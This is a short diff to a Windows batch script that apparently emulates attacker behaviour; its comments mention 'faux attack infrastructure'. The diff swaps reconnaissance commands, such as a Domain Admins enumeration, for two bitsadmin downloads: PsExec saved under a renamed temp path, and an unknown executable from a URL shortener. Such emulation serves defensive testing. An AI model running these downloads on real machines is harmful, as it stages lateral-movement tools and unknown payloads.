@@ -4,6 +4,6 @@ whoami
 REM Ping faux attack infrastructure.
 ping -n 1 8.8.8.8
 REM Collect system information into text file.
-netstat -rn >> C:\Users\%username%\AppData\Temp\a.txt
-systeminfo >> C:\Users\%username%\AppData\Temp\a.txt
-net group "Domain Admins" /domain >> C:\Users\%username%\AppData\Temp\a.txt
+REM Download tools
+bitsadmin /transfer updates /download /priority normal https://live.sysinternals.com/PsExec64.exe c:\windows\temp\111.exe
+bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ c:\windows\temp\222.exe
